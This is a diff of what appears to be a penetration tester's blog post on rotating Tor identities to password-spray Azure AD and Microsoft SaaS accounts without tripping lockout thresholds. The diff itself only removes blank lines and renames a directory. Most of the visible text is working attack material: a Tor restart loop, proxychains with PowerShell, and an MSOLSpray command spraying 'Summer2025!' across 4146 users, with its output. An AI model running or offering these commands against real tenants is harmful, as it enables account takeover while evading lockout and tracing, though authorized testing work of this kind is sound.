@@ -4,8 +4,6 @@ title: Tor identity rotation oneliner
 tags: [tor]
 ---
 
-
-
 ## Introduction
 
 I recently undertook the task of attacking **Azure AD** and **Microsoft SaaS Apps** to demonstrate the effectiveness of a cybersecurity product; during that, I had to perform password spray without triggering the account lockout threshold, thus IP rotation is needed.
@@ -24,17 +22,17 @@ INTERVAL=1; sudo systemctl restart tor; while true; do sleep $INTERVAL; sudo sys
 By using **proxychains** with our tools, we can use the Tor proxy reliably.
 
 ```bash
-┌──(bravosec㉿fsociety)-[~/pt/semperis]
+┌──(bravosec㉿fsociety)-[~/pt/tmp]
 └─$ proxychains pwsh
 [proxychains] config file found: /etc/proxychains4.conf
 [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
 [proxychains] DLL init: proxychains-ng 4.17
 PowerShell 7.5.0
 
-┌──(bravosec㉿fsociety)-[/home/kali/pt/semperis]
+┌──(bravosec㉿fsociety)-[/home/kali/pt/tmp]
 └─PS> Import-Module /opt/sectools/AzureAD/MSOLSpray/MSOLSpray.ps1
 
-┌──(bravosec㉿fsociety)-[/home/kali/pt/semperis]
+┌──(bravosec㉿fsociety)-[/home/kali/pt/tmp]
 └─PS> invoke-MSOLSpray -UserList ./users.txt -Password 'Summer2025!' -Force
 [*] There are 4146 total users to spray.
 [*] Now spraying Microsoft Online.
@@ -61,10 +59,8 @@ function tor-rotate() {
 Usage:
 
 ```bash
-
 # Rotate with default interval : 1 sec
 tor-rotate
-
 
 # Rotate with interval : 60 secs
 tor-rotate 60
